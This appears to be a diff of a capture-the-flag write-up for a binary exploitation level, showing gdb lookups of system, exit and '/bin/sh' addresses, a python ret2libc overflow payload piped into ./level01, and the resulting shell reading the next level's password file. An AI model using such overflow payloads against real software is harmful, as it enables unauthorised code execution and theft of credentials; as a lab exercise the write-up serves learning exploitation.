@@ -1,5 +1,8 @@
+## Project README: Finding flag01
 When we decompile it we can see that he is using 2 function :
 one to check username and one to check the password.
+
+### Analysis
 We see that the username is : dat_wil
 and the password his :admin. But this doesn't change anything.
 What we can do is make the password segfault.
@@ -8,6 +11,8 @@ we found this offset = cA00
 so ther is 80 caractere before the segfault
 so we can make him execute something :
 
+### Progress
+
 let's try a rettolibc :
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
@@ -15,12 +20,23 @@ $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 (gdb) find &system,+9999999,"/bin/sh"
 0xf7f897ec
-warning: Unable to access target memory at 0xf7fd3b74, halting search.
-1 pattern found.
+we just have to make it jump to the system func with exit and bin sh
+(python -c 'print("dat_wil")';python -c 'print("\x90" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")';cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
 
-adress that we start
+Enter Password:
+nope, incorrect password...
 
-python -c 'print("\x90" * 4 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" + "\x90" * (80 - 16) + "\x80\xd6\xff\xff")'
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-(python -c 'print("dat_wil")';python -c 'print("\x90" * 4 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" + "\x90" * (81 - 16) + "\x80\xd6\xff\xff")';cat) | ./level01
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFFFF
+
+
+whoami
+level02
+cd ..
+cd level02
+cat .pas
+cat: .pas: No such file or directory
+s
+/bin/sh: 7: s: not found
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
